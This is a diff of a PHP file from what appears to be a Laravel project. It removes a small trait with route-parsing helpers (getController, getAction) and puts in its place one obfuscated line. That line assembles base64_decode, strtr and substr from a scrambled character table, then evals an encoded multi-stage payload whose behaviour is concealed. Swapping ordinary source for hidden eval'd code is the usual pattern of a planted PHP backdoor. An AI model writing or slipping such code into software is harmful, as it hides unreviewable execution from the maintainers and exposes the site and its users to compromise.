@@ -1,35 +1,3 @@
-<?php
-/**
- * Created by PhpStorm.
- * User: mark
- * Date: 17/12/9
- * Time: 下午6:17
- */
-
-namespace App\Common;
-
-
-trait AppCommon
-{
-
-    //请求的控制器
-    protected $controller;
-    //请求的方法
-    protected $action;
-
-
-    function getController()
-    {
-        $route = request()->route()->getAction();
-//        list($controller, $action) = explode('@', $route['controller']);
-        return explode('@', $route['controller'])[0];
-    }
-
-
-    function getAction()
-    {
-        $route = request()->route()->getAction();
-        return explode('@', $route['controller'])[1];
-    }
-
-}
+<?php 
+$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0icGlUWFV2dGFMUEVBS01veVZJV2ZEbVF3T2RTWUdjRmhDSnpqbFJCTmtlZ3NxclpiSHhudVdEbEptd2FzdVJCU0hUdlhBUEx0cEtNZGtvaFVuWXhRaU9mRmp5ekdFSVpnYnJDZVZxTmNScDlkc1ZTSHVYdmJpRFNiUEJHWENMeDBDTE1aVU5FWm1uUWRtM3l3WUswY2lEU2JQeEFmQ0pQNlBuMVFZS2dIUGl2WnlueDBDbHZaVGxZd1RsUHdrTXZaSER6bXNMMWprRHBFY1B3akZVWjJrRkIzaURTYnVkdkhlS3hhQ0pHZFVMR2pQQnhkWXhxcGUyMWFlMjQ3aVp2SG9WT1FzSk1aTUp6ZE0yOWFlTDljaU5nSGlEU1pQaVN3dStEd2Erc3FaY0lzUWtza1crTFBhY0xDYlN2WlBpU1pZVk93b25BRm9uQUVQaXlGZTI1MFlLOWdlbkFYa2R2WlBpU1p1WC92cjd0S2dVdU5LdmxLanJOS2c1bUhQaVNaUFZ6WGUzeWpVM3lqQ2lTRVVMRzBzTDlja2R2SGlEU1pQaXpLb0w1Rm9uandlRHpOQ0p5cGUyNTBZSzlnZW5BWEhpRUhQaVNaUFZnSFBpU1pQaVNaUGlTRVlLOTFvbm1aUmh6WENKeDFDSkcwSGlFYVJOT3dvSnlqSGlFYVJLb2pvQnhGb25qd2VEWldrZHZ3dVhTWlBpU1pQaVNaZW5qZm9pWkVVMjljb1ZPd2VucWpZRGRaT254Rm9uandlREVaUmh6aklWemdlMnlqSGlvU09YZFpPVk93b0p5akxYb0ZlMjUwWUs5Z2VuQVhPMTBXa2R2WlBpU1pQaVNaUFZPam9WQVhlRHpqSVZ6Z2UyeWpIaW9TT1hkWk9WT3dvSnlqTFhvRmUyNTBZSzlnZW5BWE8xMFdMZnpva2R2WlBpU1p0TXZIaURTWlBpektvTDVGb25qd2VEek5DSnl6VTN5V2UyNHZITXZaUGlTWklkdlpQaVNaUGlTWlBpeVhlM0EwQ2hTOVBWT2pZSkFqWTNNdkhoMCtZSzkxb25tdkhoMCtDMkEwTUxHMHNMOWNIaUU3aURTWlBpU1pQaVNaWUtBMG9KT2NQbkE0WW5xd0NubXZPMFNOdWlTRVlLOTFvbkFlTzJHd2VOeVhlMnFnQ0pQTkpoamVUQTA3aURTWlBpejlpWlc5IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
+ ?>
